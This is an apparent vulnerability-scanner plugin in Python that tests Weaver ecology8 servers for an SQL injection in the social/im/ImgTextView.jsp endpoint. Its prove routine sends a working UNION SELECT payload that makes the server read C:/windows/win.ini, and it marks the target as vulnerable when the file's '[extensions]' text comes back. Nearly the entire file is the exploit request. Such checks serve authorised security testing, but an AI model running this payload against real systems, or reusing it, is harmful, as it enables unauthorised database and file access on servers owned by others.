#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    ecology8 social sql inject
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        url = path +"social/im/ImgTextView.jsp?url=/weaver/weaver.file.SignatureDownLoad&markId=-1%20union(select%20%27C%3A%2Fwindows%2Fwin.ini%27%20from%20v%24instance)"
                        async with session.get(url=url) as res:
                            if res:
                                text = await res.text()
                                if '[extensions]' in text:
                                    yield url
                                    